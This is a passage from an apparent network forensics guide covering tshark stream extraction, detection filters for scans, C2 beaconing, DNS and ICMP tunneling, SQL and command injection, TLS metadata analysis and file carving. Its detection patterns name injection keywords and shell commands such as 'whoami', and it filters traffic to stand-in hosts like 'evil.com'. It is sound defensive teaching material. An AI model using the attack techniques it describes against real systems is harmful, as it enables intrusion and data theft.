tshark -r capture.pcap -Y "tcp.stream eq 42 and ip.dst == 192.168.1.50" -T fields -e tcp.payload | xxd -r -p > server_data.bin
```

**UDP Stream Extraction**

UDP is connectionless but Wireshark groups related UDP traffic into streams:

```bash
tshark -r capture.pcap -T fields -e udp.stream | sort -n | uniq
```

Extract UDP stream:

```bash
tshark -r capture.pcap -Y "udp.stream eq 5" -w udp_stream_5.pcap
```

**Application-Specific Stream Extraction**

**HTTP Stream Extraction:**

```bash
tshark -r capture.pcap -Y "http" -T fields -e tcp.stream | sort -n | uniq
```

Lists streams containing HTTP traffic.

Extract complete HTTP conversation:

```bash
tshark -r capture.pcap -Y "tcp.stream eq 12" -w http_conversation.pcap
```

**DNS Stream Extraction:**

Extract all DNS traffic:

```bash
tshark -r capture.pcap -Y "dns" -w dns_traffic.pcap
```

Extract queries to specific domain:

```bash
tshark -r capture.pcap -Y 'dns.qry.name contains "evil.com"' -w evil_dns.pcap
```

**TLS Stream Extraction:**

Extract TLS handshakes:

```bash
tshark -r capture.pcap -Y "ssl.handshake.type" -w tls_handshakes.pcap
```

Extract encrypted application data:

```bash
tshark -r capture.pcap -Y "ssl.app_data" -w tls_encrypted_data.pcap
```

**Bulk Stream Extraction Automation**

Extract all TCP streams automatically:

```bash
#!/bin/bash
for stream in $(tshark -r capture.pcap -T fields -e tcp.stream | sort -n | uniq); do
    tshark -r capture.pcap -Y "tcp.stream eq $stream" -w streams/tcp_stream_$stream.pcap
    echo "Extracted stream $stream"
done
```

**Stream Filtering by Characteristics**

Extract streams with high data volume:

```bash
tshark -r capture.pcap -qz conv,tcp | awk '$8 > 1000000 {print $1,$3}' 
```

Shows conversations exceeding 1MB. Extract identified streams for analysis.

Extract long-duration connections:

```bash
tshark -r capture.pcap -qz conv,tcp | awk '$10 > 300'
```

Shows connections lasting over 300 seconds. Persistent connections might indicate C2 channels.

**Stream Content Identification**

Identify stream content type before extraction:

```bash
tshark -r capture.pcap -Y "tcp.stream eq 42" -T fields -e tcp.payload | head -1 | xxd -r -p | file -
```

Uses `file` command magic bytes detection on first packet payload.

**Stream Reassembly Validation**

Verify stream extraction completeness:

1. Count original stream packets:

```bash
tshark -r capture.pcap -Y "tcp.stream eq 42" | wc -l
```

2. Count extracted stream packets:

```bash
tshark -r stream_42.pcap | wc -l
```

3. Compare payload bytes:

```bash
tshark -r capture.pcap -Y "tcp.stream eq 42" -T fields -e tcp.payload | wc -c
tshark -r stream_42.pcap -T fields -e tcp.payload | wc -c
```

**Multi-Stream Extraction**

Extract related streams (e.g., FTP control and data channels):

```bash
# Extract FTP control
tshark -r capture.pcap -Y "tcp.port == 21" -T fields -e tcp.stream | sort -n | uniq > ftp_control_streams.txt

# For each control stream, identify data streams from PASV responses
while read stream; do
    tshark -r capture.pcap -Y "tcp.stream eq $stream" -w ftp_control_$stream.pcap
done < ftp_control_streams.txt
```

**Stream Splitting by Time**

Extract portions of long-running stream:

```bash
# First hour of stream
tshark -r capture.pcap -Y "tcp.stream eq 42 and frame.time >= \"2024-10-12 08:00:00\" and frame.time < \"2024-10-12 09:00:00\"" -w stream_42_hour1.pcap
```

**Stream Format Conversion**

Convert stream to different formats for analysis:

**JSON output:**

```bash
tshark -r stream_42.pcap -T json > stream_42.json
```

**CSV output:**

```bash
tshark -r stream_42.pcap -T fields -e frame.time -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e tcp.len -E header=y -E separator=, > stream_42.csv
```

**Text summary:**

```bash
tshark -r stream_42.pcap -V > stream_42_verbose.txt
```

**Encrypted Stream Handling**

Extract encrypted streams for offline cryptanalysis:

```bash
tshark -r capture.pcap -Y "ssl.record" -w encrypted_streams.pcap
```

Even without decryption keys, metadata analysis reveals:

- Connection patterns
- Data volume and timing
- Certificate details
- Cipher suites negotiated

**Stream Payload Analysis**

After extraction, analyze payload:

**File type identification:**

```bash
file stream_payload.bin
```

**String extraction:**

```bash
strings -a stream_payload.bin > stream_strings.txt
```

**Entropy analysis (detect encryption/compression):**

```bash
ent stream_payload.bin
```

High entropy (near 8 bits/byte) suggests encryption or compression.

**Hex dump analysis:**

```bash
xxd stream_payload.bin | less
```

Look for:

- File signatures (magic bytes)
- ASCII strings
- Repeated patterns
- Protocol markers

**Stream Metadata Extraction**

Extract stream metadata without payload:

```bash
tshark -r capture.pcap -Y "tcp.stream eq 42" -T fields -e frame.number -e frame.time -e tcp.seq -e tcp.ack -e tcp.len -e tcp.flags
```

Reveals:

- Packet sequencing
- Timing characteristics
- TCP flow control behavior
- Flag usage patterns

## Malicious Traffic Patterns

Malicious network activity exhibits characteristic patterns distinguishable from legitimate traffic. Recognition enables detection and investigation.

**Port Scanning Patterns**

**TCP SYN Scan:**

Characteristics:

- Single source IP
- Many destination ports on single or multiple hosts
- SYN packets without completing handshake
- No application data transferred

Detection filter:

```
tcp.flags.syn == 1 and tcp.flags.ack == 0
```

Analyze source IPs:

```bash
tshark -r capture.pcap -Y "tcp.flags.syn == 1 and tcp.flags.ack == 0" -T fields -e ip.src | sort | uniq -c | sort -rn
```

High packet counts from single IP indicate scanning.

**TCP Connect Scan:**

Characteristics:

- Complete three-way handshakes
- Immediate connection termination (RST or FIN)
- Multiple sequential port connections
- Very short connection duration

Detection:

```bash
tshark -r capture.pcap -Y "tcp.flags.syn == 1" -T fields -e ip.src -e ip.dst -e tcp.dstport | awk '{print $1}' | sort | uniq -c | sort -rn
```

Single source connecting to many ports suggests connect scan.

**UDP Scan:**

Characteristics:

- UDP packets to many ports
- ICMP port unreachable responses for closed ports
- No response for open ports (UDP is connectionless)

Detection:

```
udp or icmp.type == 3
```

**Stealth Scan Techniques:**

**FIN Scan:**

```
tcp.flags.fin == 1 and tcp.flags.ack == 0
```

**NULL Scan:**

```
tcp.flags == 0x000
```

**XMAS Scan:**

```
tcp.flags.fin == 1 and tcp.flags.push == 1 and tcp.flags.urg == 1
```

These scans exploit RFC specifications - closed ports respond with RST, open ports ignore packet.

**Command and Control (C2) Traffic Patterns**

**Beaconing Behavior:**

Characteristics:

- Regular periodic connections (every 60s, 300s, 3600s)
- Small data exchanges
- Consistent destination IP/domain
- Persistent over long periods

Detection methodology:

1. Extract connection timestamps for suspicious host:

```bash
tshark -r capture.pcap -Y "ip.src == 192.168.1.50" -T fields -e frame.time_epoch -e ip.dst -e tcp.dstport
```

2. Calculate inter-packet timing:

```bash
awk '{if(last[$2$3]) print $1-last[$2$3], $2, $3; last[$2$3]=$1}'
```

3. Identify regular intervals in output

Regular intervals (e.g., exactly 300 seconds) indicate automated beaconing.

**DNS C2 Patterns:**

Characteristics:

- High volume queries to single domain
- Long subdomain labels (data encoding)
- Unusual TXT record queries
- Regular query timing

Detection:

```bash
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | awk -F. '{print $(NF-1)"."$NF}' | sort | uniq -c | sort -rn
```

Shows query counts per second-level domain.

Excessive queries to single domain:

```bash
tshark -r capture.pcap -Y 'dns.qry.name contains "suspicious.com"' | wc -l
```

**HTTP/HTTPS C2 Patterns:**

Characteristics:

- Uncommon user agents or missing user agent
- Regular GET/POST requests to same URI
- Small, consistent payload sizes
- Unusual headers or URI structures

Detection:

```
http.user_agent
```

Examine for:

- Empty or minimal user agents
- Programming language identifiers (python-requests, Go-http-client)
- Generic strings (Mozilla/4.0)

**Data Exfiltration Patterns**

**Large Outbound Transfers:**

Characteristics:

- High data volume from internal to external host
- Unusual protocols or ports
- Off-hours activity
- Connections to cloud storage or file sharing services

Detection:

```bash
tshark -r capture.pcap -Y "ip.src == 192.168.0.0/16" -qz conv,tcp | sort -k8 -rn | head
```

Shows top conversations by byte count from internal network.

**DNS Tunneling Exfiltration:**

Characteristics:

- Extremely long DNS queries (>50 characters)
- High DNS query rate to single domain
- Base64 or hex-encoded appearance in queries
- Unusual TXT record queries with large responses

Detection:

```bash
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name -e dns.qry.name.len | awk '$2 > 50'
```

Shows queries exceeding 50 characters.

**ICMP Tunneling:**

Characteristics:

- ICMP packets with unusual payload sizes
- Regular ICMP traffic patterns
- Unexpected ICMP types (not echo request/reply)

Detection:

```
icmp and data.len > 100
```

Standard ping uses small payloads (32-64 bytes). Large ICMP payloads suggest tunneling.

**DDoS Attack Patterns**

**SYN Flood:**

Characteristics:

- Massive SYN packet volume
- Many source IPs to single destination
- No ACK responses to SYN-ACK
- Destination resource exhaustion

Detection:

```bash
tshark -r capture.pcap -Y "tcp.flags.syn == 1 and tcp.flags.ack == 0" -T fields -e ip.dst | sort | uniq -c | sort -rn
```

High SYN counts to single destination indicate flood.

**UDP Flood:**

Characteristics:

- High volume UDP packets
- Many sources to single destination
- Often to random high ports
- May include amplification (DNS, NTP)

Detection:

```bash
tshark -r capture.pcap -Y "udp" -T fields -e ip.dst | sort | uniq -c | sort -rn
```

**DNS Amplification:**

Characteristics:

- Small DNS queries with spoofed source IP
- Large DNS responses to victim IP
- Queries for ANY or large record types
- Queries to open resolvers

Detection:

```
dns.qry.type == 255
```

(Type 255 is ANY query)

**HTTP Flood:**

Characteristics:

- High rate of HTTP requests
- Multiple sources to single web server
- Valid-looking requests (harder to filter)
- May target specific resource-intensive URIs

Detection:

```bash
tshark -r capture.pcap -Y "http.request" -T fields -e ip.dst -e http.request.uri | sort | uniq -c | sort -rn
```

**Brute Force Attack Patterns**

**Authentication Brute Force:**

Characteristics:

- Multiple failed login attempts
- Single source, single destination
- Rapid sequential connection attempts
- May use common username/password combinations

**HTTP Authentication:**

```
http.response.code == 401
```

Count per source:

```bash
tshark -r capture.pcap -Y "http.response.code == 401" -T fields -e ip.src | sort | uniq -c | sort -rn
```

**SSH Brute Force:**

```
tcp.port == 22
```

Look for many short connections from single source. Each failed attempt results in quick disconnect.

**FTP Brute Force:**

```
ftp.response.code == 530
```

Response code 530 indicates login failure.

**Exploitation Attempt Patterns**

**SQL Injection:**

Characteristics:

- HTTP parameters containing SQL keywords
- Single quote characters in URIs
- UNION, SELECT, DROP keywords
- Error messages in responses

Detection:

```
http.request.uri contains "union" or http.request.uri contains "select" or http.request.uri contains "'"
```

**Command Injection:**

Characteristics:

- Shell metacharacters in HTTP parameters
- Semicolons, pipes, ampersands in URIs
- System commands (cat, ls, whoami) in requests

Detection:

```
http.request.uri contains ";" or http.request.uri contains "|" or http.request.uri contains "whoami"
```

**Buffer Overflow Attempts:**

Characteristics:

- Extremely long parameter values
- Repeated characters (NOP sleds)
- Unusual binary data in application protocols

Detection:

```
http.request.uri.len > 1000
```

**Malware Communication Patterns**

**Fast Flux Networks:**

Characteristics:

- Rapid DNS record changes
- Very short TTLs
- Multiple A records per domain
- Frequently changing IP associations

Detection:

```
dns.resp.ttl < 300
```

Short TTLs allow rapid IP rotation.

**Domain Generation Algorithm (DGA):**

Characteristics:

- Random-looking domain names
- High consonant-to-vowel ratio
- Unusual character combinations
- Many NXDOMAIN responses
- Queries to multiple random domains

Detection:

```
dns.flags.rcode == 3
```

Count NXDOMAIN responses per source:

```bash
tshark -r capture.pcap -Y "dns.flags.rcode == 3" -T fields -e ip.src | sort | uniq -c | sort -rn
```

**Peer-to-Peer (P2P) C2:**

Characteristics:

- Connections to multiple peers
- Non-standard ports
- Binary protocols
- DHT (Distributed Hash Table) traffic patterns

Detection involves identifying unusual peer-to-peer communication patterns not matching known legitimate P2P applications (BitTorrent, etc.).

**Lateral Movement Patterns**

**Internal Reconnaissance:**

Characteristics:

- Internal host scanning other internal hosts
- SMB, RDP, SSH connection attempts
- Windows administrative protocols (WMI, WinRM, PSExec)

Detection:

```
tcp.port == 445 or tcp.port == 139 or tcp.port == 3389 or tcp.port == 5985
```

Count internal sources connecting to many internal destinations:

```bash
tshark -r capture.pcap -Y "ip.src == 192.168.0.0/16 and ip.dst == 192.168.0.0/16 and (tcp.port == 445 or tcp.port == 3389)" -T fields -e ip.src -e ip.dst | awk '{print $1}' | sort | uniq -c | sort -rn
```

**Pass-the-Hash/Ticket Attacks:**

Characteristics:

- NTLM authentication from unexpected sources
- Kerberos ticket requests with unusual patterns
- Successful authentications without corresponding password changes

[Inference] Detection requires deep inspection of authentication protocols and correlation with authentication logs, which may not be fully visible in packet captures alone.

**RDP Session Hijacking:**

Characteristics:

- RDP connections originating from unusual internal sources
- RDP traffic between two internal hosts (not just to terminal servers)

Detection:

```
tcp.port == 3389 and ip.src == 192.168.0.0/16 and ip.dst == 192.168.0.0/16
```

## TLS/SSL Analysis Basics

Transport Layer Security (TLS) encrypts network communications, protecting confidentiality and integrity. Forensic analysis examines handshake metadata, certificates, and traffic patterns even when content is encrypted.

**TLS Protocol Structure**

TLS operates in layers:

**Record Protocol** - provides encryption, compression, and integrity **Handshake Protocol** - negotiates cipher suites and establishes keys **Alert Protocol** - communicates errors and warnings **Application Data** - encrypted payload

**TLS Handshake Analysis**

Standard TLS handshake sequence:

1. **Client Hello** - Client initiates, proposes TLS versions and cipher suites
2. **Server Hello** - Server selects TLS version and cipher suite
3. **Certificate** - Server sends X.509 certificate chain
4. **Server Key Exchange** - (Optional) Server provides key exchange parameters
5. **Server Hello Done** - Server completes hello phase
6. **Client Key Exchange** - Client sends key exchange information
7. **Change Cipher Spec** - Both parties switch to encrypted communication
8. **Finished** - Both parties verify handshake integrity

Filter TLS handshakes:

```
ssl.handshake.type
```

Or more specifically:

```
ssl.handshake.type == 1
```

(Type 1 is Client Hello)

**Client Hello Analysis**

Examine client capabilities:

```bash
tshark -r capture.pcap -Y "ssl.handshake.type == 1" -V
```

Key fields:

- **TLS Version** - Proposed versions (TLS 1.2, TLS 1.3)
- **Cipher Suites** - Supported encryption algorithms
- **Extensions** - SNI, ALPN, supported groups, etc.

**Server Name Indication (SNI):**

```
ssl.handshake.extensions_server_name
```

SNI extension reveals destination hostname in cleartext, enabling domain identification even in encrypted traffic:

```bash
tshark -r capture.pcap -Y "ssl.handshake.type == 1" -T fields -e ssl.handshake.extensions_server_name | sort | uniq
```

Lists all contacted domains via TLS.

**Cipher Suite Analysis:**

```bash
tshark -r capture.pcap -Y "ssl.handshake.type == 1" -T fields -e ssl.handshake.ciphersuite
```

Weak cipher suites indicate:

- Outdated clients/servers
- Deliberate downgrade attempts
- Vulnerable implementations

Look for:

- NULL encryption (no encryption)
- EXPORT cipher suites (intentionally weakened)
- RC4 (broken stream cipher)
- DES/3DES (deprecated block ciphers)
- MD5-based MACs (weak integrity)

**Server Hello Analysis**

Examine server selection:

```bash
tshark -r capture.pcap -Y "ssl.handshake.type == 2" -V
```

Key fields:

- **Selected TLS Version** - Server's chosen version
- **Selected Cipher Suite** - Negotiated encryption
- **Session ID** - For session resumption
- **Extensions** - Server-supported features

**Certificate Analysis**

Extract certificate information:

```bash
tshark -r capture.pcap -Y "ssl.handshake.type == 11" -T fields -e x509ce.dNSName -e x509sat.uTF8String -e x509sat.printableString
```

Certificate fields for investigation:

**Subject** - Entity certificate represents:

```
x509sat.commonName
```

**Issuer** - Certificate Authority that signed:

```
x509if.issuer
```

**Validity Dates:**

```
x509af.notBefore
x509af.notAfter
```

**Subject Alternative Names (SAN):**

```
x509ce.dNSName
```

Lists additional hostnames covered by certificate.

**Certificate Validation Issues**

Self-signed certificates:

```
x509af.issuer == x509af.subject
```

[Inference] Self-signed certificates in production environments may indicate:

- Internal services
- Malware C2 infrastructure
- Man-in-the-middle attacks
- Cost-cutting on legitimate services

Expired certificates:

Compare `x509af.notAfter` against capture timestamp. Expired certificates suggest:

- Poorly maintained infrastructure
- Compromised systems using old certificates
- Deliberate evasion (some malware uses expired certificates)

**Certificate Chain Extraction**

Export certificates for offline analysis:

```bash
tshark -r capture.pcap -Y "ssl.handshake.certificate" --export-objects "ssl,ssl_certs/"
```

Analyze extracted certificates:

```bash
openssl x509 -in certificate.der -inform DER -text -noout
```

Reveals full certificate details including:

- Public key algorithm and size
- Signature algorithm
- Certificate extensions
- Key usage restrictions

**TLS Version Analysis**

Identify TLS versions in use:

```bash
tshark -r capture.pcap -Y "ssl.handshake.version" -T fields -e ssl.handshake.version | sort | uniq -c
```

Output maps hex values to versions:

- 0x0301 = TLS 1.0
- 0x0302 = TLS 1.1
- 0x0303 = TLS 1.2
- 0x0304 = TLS 1.3

Older versions (TLS 1.0, 1.1, SSLv3, SSLv2) indicate:

- Legacy systems
- Compatibility requirements
- Potential vulnerabilities

**TLS 1.3 Differences**

TLS 1.3 significantly differs from earlier versions:

- Encrypted handshake (less metadata visible)
- Mandatory forward secrecy
- Removed weak cipher suites
- Faster handshake (1-RTT)

Detection:

```
ssl.handshake.version == 0x0304
```

**JA3 Fingerprinting**

[Inference] JA3 creates fingerprints from TLS Client Hello parameters, enabling client application identification even through encryption. Malware families often share JA3 signatures.

Generate JA3 hashes with tshark (requires plugin or custom script). Standard tshark doesn't include JA3 by default.

Manual JA3 components:

- TLS Version
- Accepted Cipher Suites
- List of Extensions
- List of Supported Groups
- List of Signature Algorithms

Hash these concatenated values with MD5 to create JA3 fingerprint.

**Traffic Volume Analysis**

Even encrypted, traffic patterns reveal information:

**Connection metadata:**

```bash
tshark -r capture.pcap -Y "ssl" -T fields -e frame.time -e ip.src -e ip.dst -e ssl.handshake.type -e tcp.len
```

Analyze:

- **Handshake timing** - Slow handshakes suggest network issues or processing delays
- **Data volume per connection** - Small exchanges vs. large transfers
- **Connection duration** - Brief vs. persistent connections

**Encrypted Application Data Analysis:**

Filter for encrypted data:

```
ssl.app_data
```

Even without decryption:

- **Packet sizes** reveal application behavior patterns
- **Timing** between packets suggests interactive vs. automated
- **Upload vs. download** ratios indicate data flow direction

**Certificate Reputation Analysis**

[Unverified] Certificate authorities and certificate characteristics can be checked against threat intelligence databases, but the specific reputation of a certificate requires external verification beyond packet analysis.

Investigate certificates:

- Newly registered domains in certificates
- Certificates from free CAs used by malware (though also used legitimately)
- Unusual organizational names
- Mismatched Subject and SNI

**TLS Downgrade Attack Detection**

Downgrade attacks force use of weaker TLS versions:

Detect version negotiation failures:

```
ssl.alert.message
```

Alert types indicate issues:

- Protocol version alert
- Handshake failure
- Insufficient security

Compare Client Hello proposed versions with Server Hello selected version. Significant downgrade (client supports TLS 1.3, server selects TLS 1.0) warrants investigation.

**Perfect Forward Secrecy (PFS) Analysis**

PFS cipher suites protect past communications even if server private key is compromised:

Identify PFS cipher suites (contain DHE or ECDHE):

```bash
tshark -r capture.pcap -Y "ssl.handshake.type == 2" -T fields -e ssl.handshake.ciphersuite | grep -E "DHE|ECDHE"
```

Non-PFS cipher suites (RSA key exchange) are vulnerable to retrospective decryption if private key is obtained.

**Session Resumption Analysis**

TLS session resumption reduces handshake overhead:

**Session ID resumption:**

```
ssl.handshake.session_id
```

Client sends previous Session ID in Client Hello. If server accepts, abbreviated handshake occurs.

**Session tickets (RFC 5077):**

```
ssl.handshake.extension.type == 35
```

Server sends encrypted session state to client. Client presents ticket for resumption.

High session resumption rates indicate:

- Performance optimization
- Regular connections to same server
- Potential long-term persistent connections

**OCSP Stapling Analysis**

Online Certificate Status Protocol checking verifies certificate revocation:

```
ssl.handshake.extension.type == 5
```

OCSP stapling allows server to include OCSP response in handshake, proving certificate hasn't been revoked.

Absence of OCSP stapling doesn't prove revocation checking occurred - client may check independently.

## Packet Carving

Packet carving extracts files and data from network traffic by identifying file signatures, boundaries, and structures within packet payloads, even when protocol-level extraction fails.

**File Signature Identification**

Files begin with magic bytes identifying format. Common signatures:

- **PNG**: 89 50 4E 47 0D 0A 1A 0A
- **JPEG**: FF D8 FF
- **GIF**: 47 49 46 38
- **PDF**: 25 50 44 46
- **ZIP**: 50 4B 03 04
- **EXE (PE)**: 4D 5A
- **ELF**: 7F 45 4C 46

Search for signatures in packet payloads:

```bash
tshark -r capture.pcap -T fields -e tcp.payload | tr -d '\n' | xxd -r -p > all_payloads.bin
```

Then search for magic bytes:

```bash
xxd all_payloads.bin | grep "4d 5a"
```

**Foremost File Carving**

Foremost carves files from binary data based on headers and footers:

```bash
foremost -v -t all -i capture.pcap -o carved_files/
```

Parameters:

- `-v` verbose output
- `-t all` carve all supported file types
- `-i` input file
- `-o` output directory

Foremost configuration file `/etc/foremost.conf` defines:

- File signatures (headers)
- File footers
- Maximum file sizes
- Case sensitivity

Custom signature example:

```
pdf     y   1000000 \x25\x50\x44\x46    \x25\x25\x45\x4f\x46
```

Format: filetype case_sensitive max_size header_signature footer_signature

**Scalpel File Carving**

Scalpel is foremost successor with improved performance:

```bash
scalpel -b -o carved_output/ capture.pcap
```

Parameters:

- `-b` carve even if no footer detected
- `-o` output directory

Configure `/etc/scalpel/scalpel.conf` similarly to foremost.

**Binwalk Analysis**

Binwalk identifies and extracts embedded files and file systems:

```bash
binwalk -e capture.pcap
```

Parameters:

- `-e` automatically extract discovered files
- `-D` extract specific signature types
- `-M` recursively scan extracted files

Binwalk signature scanning:

```bash
binwalk -B capture.pcap
```

Shows byte offsets of discovered signatures.

**Manual Hex-Based Carving**

When automated tools fail, manual carving:

1. **Extract payload bytes to binary:**

```bash
tshark -r capture.pcap -Y "tcp.stream eq 42" -T fields -e tcp.payload | xxd -r -p > stream.bin
```

2. **Search for file signature:**

```bash
xxd stream.bin | grep -n "ff d8 ff"
```

Note byte offset of header.

3. **Search for footer (JPEG FF D9):**

```bash
xxd stream.bin | grep -n "ff d9"
```

4. **Extract file using dd:**

```bash
dd if=stream.bin of=carved_image.jpg bs=1 skip=12345 count=67890
```

Where `skip=` is header offset and `count=` is file length in bytes.

5. **Verify extracted file:**
```bash
file carved_image.jpg
````

**HTTP Object Carving**

When automated HTTP extraction fails, manual carving:

1. **Locate HTTP responses:**

```bash
tshark -r capture.pcap -Y "http.response" -T fields -e tcp.stream -e http.content_type -e http.content_length
```

2. **Extract specific stream:**

```bash
tshark -r capture.pcap -Y "tcp.stream eq 15" -T fields -e tcp.payload | xxd -r -p > http_stream.bin
```

3. **Find HTTP header/body boundary:** HTTP headers and body are separated by `\r\n\r\n` (0D 0A 0D 0A):

```bash
xxd http_stream.bin | grep -n "0d0a 0d0a"
```

4. **Extract body starting after boundary:** Calculate offset after `\r\n\r\n` and extract remaining data:

```bash
dd if=http_stream.bin of=extracted_file.bin bs=1 skip=<offset+4>
```

5. **Handle chunked encoding:** If Transfer-Encoding: chunked, manually remove chunk size markers. Each chunk format:

```
<hex_chunk_size>\r\n
<chunk_data>\r\n
```

Remove size lines to reconstruct original file.

**SMTP Email Carving**

Extract emails from SMTP traffic:

1. **Filter SMTP DATA command:**

```bash
tshark -r capture.pcap -Y "smtp.req.command == DATA" -T fields -e tcp.stream
```

2. **Extract email stream:**

```bash
tshark -r capture.pcap -Y "tcp.stream eq 8" -T fields -e tcp.payload | xxd -r -p > email.raw
```

3. **Locate email boundaries:** SMTP emails start after "DATA\r\n" command and end with "\r\n.\r\n"
    
4. **Parse MIME structure:** Extract attachments from multipart/mixed content using boundary markers specified in Content-Type header.
    

**FTP Data Carving**

FTP data channel carries file contents:

1. **Identify FTP control commands:**

```bash
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg -e tcp.stream
```

Look for RETR (retrieve) or STOR (store) commands with filenames.

2. **Find corresponding data channel:** FTP PASV response or PORT command indicates data channel port. Track TCP streams on that port immediately following file command.
    
3. **Extract data channel stream:**
    

```bash
tshark -r capture.pcap -Y "tcp.stream eq <data_stream>" -T fields -e tcp.payload | xxd -r -p > ftp_file.bin
```

4. **Verify file integrity:** If FTP control channel shows file size, verify extracted file matches:

```bash
ls -l ftp_file.bin
```

**DNS Tunneling Data Carving**

Extract data encoded in DNS queries:

1. **Filter DNS queries to specific domain:**

```bash
tshark -r capture.pcap -Y 'dns.qry.name contains "tunnel.evil.com"' -T fields -e dns.qry.name
```

2. **Extract encoded subdomains:**

```bash
tshark -r capture.pcap -Y 'dns.qry.name contains "tunnel.evil.com"' -T fields -e dns.qry.name | sed 's/.tunnel.evil.com//' > encoded_data.txt
```

3. **Decode data:** Depending on encoding (base64, hex, custom), decode extracted strings:

```bash
cat encoded_data.txt | base64 -d > decoded_data.bin
```

Or for hex encoding:

```bash
cat encoded_data.txt | xxd -r -p > decoded_data.bin
```

4. **Extract from TXT records:** For data in responses:

```bash
tshark -r capture.pcap -Y 'dns.txt' -T fields -e dns.txt | base64 -d > txt_decoded.bin
```

**ICMP Tunneling Data Carving**

Extract data from ICMP payloads:

1. **Filter ICMP packets:**

```bash
tshark -r capture.pcap -Y "icmp" -w icmp_only.pcap
```

2. **Extract ICMP data payloads:**

```bash
tshark -r icmp_only.pcap -T fields -e data.data | xxd -r -p > icmp_payloads.bin
```

3. **Identify tunneling patterns:** Standard ping payloads are recognizable patterns (alphabet, sequential numbers). Unusual payloads suggest tunneling.
    
4. **Remove ICMP headers and extract embedded data:** ICMP data field follows 8-byte header. Skip headers:
    

```bash
dd if=icmp_payloads.bin of=tunneled_data.bin bs=8 skip=1
```

**Compressed Archive Carving**

Extract compressed files from traffic:

**ZIP files:**

- Header: 50 4B 03 04
- Footer: 50 4B 05 06 (end of central directory)

```bash
foremost -t zip -i capture.pcap -o zip_carved/
```

**GZIP files:**

- Header: 1F 8B
- No fixed footer, uses stream structure

**RAR files:**

- Header: 52 61 72 21 1A 07

**7-Zip files:**

- Header: 37 7A BC AF 27 1C

**Encrypted Archive Handling**

Encrypted archives can be carved but content remains inaccessible without password. Forensic value:

- Presence proves data handling
- Archive metadata may be unencrypted (filenames in some formats)
- Password cracking attempts possible offline

**Fragmented File Reassembly**

TCP segmentation splits files across multiple packets:

1. **Ensure proper TCP stream reassembly:**

```bash
tshark -r capture.pcap -Y "tcp.stream eq 42" -w stream_42.pcap
```

2. **Extract reassembled payload:**

```bash
tshark -r stream_42.pcap -T fields -e tcp.payload | tr -d '\n' | xxd -r -p > reassembled.bin
```

TCP sequence numbers ensure correct reassembly order.

**UDP Fragment Reassembly:**

UDP lacks built-in reassembly. IP fragmentation handles large UDP datagrams:

```bash
tshark -r capture.pcap -Y "ip.addr == 192.168.1.50 and udp" -w udp_fragments.pcap
```

Wireshark automatically reassembles IP fragments for display and export.

**Cross-Stream File Reassembly**

Some protocols split transfers across multiple connections (HTTP Range requests, FTP with multiple data channels):

1. **Identify related streams:**

```bash
tshark -r capture.pcap -Y "http.request.uri contains '/largefile.bin'" -T fields -e tcp.stream -e http.range
```

2. **Extract each range:**

```bash
tshark -r capture.pcap -Y "tcp.stream eq 10" -T fields -e tcp.payload | xxd -r -p > range_0.bin
tshark -r capture.pcap -Y "tcp.stream eq 11" -T fields -e tcp.payload | xxd -r -p > range_1.bin
```

3. **Concatenate in proper order:**

```bash
cat range_0.bin range_1.bin > complete_file.bin
```

**Malformed Protocol Carving**

Malware or exploits may use malformed protocols. Standard tools fail, requiring manual extraction:

1. **Identify anomalous traffic:**

```bash
tshark -r capture.pcap -Y "tcp.analysis.flags" -T fields -e tcp.analysis.flags -e tcp.stream
```

Shows streams with TCP anomalies (retransmissions, out-of-order, etc.)

2. **Extract suspicious stream:**

```bash
tshark -r capture.pcap -Y "tcp.stream eq 25" -T fields -e tcp.payload | xxd -r -p > malformed.bin
```

3. **Manual analysis:**

```bash
xxd malformed.bin | less
strings malformed.bin
binwalk malformed.bin
```

**Steganography Detection**

Files may hide data within legitimate carriers:

**Image steganography indicators:**

- Unusual file sizes (larger than expected for resolution)
- Metadata anomalies
- LSB (Least Significant Bit) analysis

Tools for steganalysis:

```bash
stegdetect carved_image.jpg
steghide info carved_image.jpg
```

**Partial File Recovery**

When complete file cannot be recovered:

1. **Carve available portions:**

```bash
foremost -b -i partial_stream.bin -o partial_carved/
```

The `-b` flag attempts carving without footers.

2. **Analyze file structure:** Many formats (ZIP, PDF) have central directories or tables of contents at specific locations. Extract metadata even if content incomplete.
    
3. **Document recovery limitations:** Note which portions were recovered and what remains missing. Hash partial files for future correlation.
    

**Carving Validation**

After carving, validate extracted files:

1. **File type verification:**

```bash
file carved_file.bin
```

2. **Hash calculation:**

```bash
sha256sum carved_file.bin
```

3. **Virus scanning:**

```bash
clamscan carved_file.bin
```

4. **Structural integrity:**

```bash
# For images
identify carved_image.jpg

# For PDFs
pdfinfo carved_document.pdf

# For executables
readelf -h carved_binary.elf
```

5. **Comparison with known samples:** If original file is suspected, compare hashes or use fuzzy hashing:

```bash
ssdeep carved_file.bin known_file.bin
```

**Automated Carving Workflows**

Batch process captures:

```bash
#!/bin/bash
for pcap in *.pcap; do
    echo "Processing $pcap"
    foremost -t all -i "$pcap" -o "carved_${pcap%.pcap}"
    scalpel -b -o "scalpel_${pcap%.pcap}" "$pcap"
    binwalk -e "$pcap"
done
```

**Large Capture Handling**

For multi-gigabyte captures:

1. **Split by protocol:**

```bash
tshark -r huge.pcap -Y "http" -w http_only.pcap
tshark -r huge.pcap -Y "ftp" -w ftp_only.pcap
```

2. **Split by time:**

```bash
editcap -i 3600 huge.pcap split_hourly.pcap
```

3. **Process splits individually:**

```bash
for split in split_*.pcap; do
    foremost -i "$split" -o "carved_${split}"
done
```

**Memory-Efficient Carving**

For systems with limited RAM:

Use streaming tools instead of loading entire PCAP:

```bash
tshark -r capture.pcap -Y "tcp.stream eq 42" -T fields -e tcp.payload | while read line; do
    echo "$line" | xxd -r -p >> stream_42.bin
done
```

**Chain of Custody for Carved Files**

Document carved file origins:

1. **Source PCAP file and hash**
2. **Carving tool and version**
3. **Exact command used**
4. **Stream or packet numbers containing file**
5. **File offset within stream**
6. **Carved file hash**
7. **Timestamp of carving operation**
8. **Examiner identity**

Example documentation:

```
Carved File: document.pdf
Source: case2024-001_network.pcap (SHA256: 7a79c3a...)
Tool: foremost 1.5.7
TCP Stream: 142
Byte Offset: 8192-45678
File Hash: 3f7a2b9d... (SHA256)
Carved: 2024-10-12 14:30:22 UTC
Examiner: John Doe
```

**False Positive Handling**

Carving tools generate false positives:

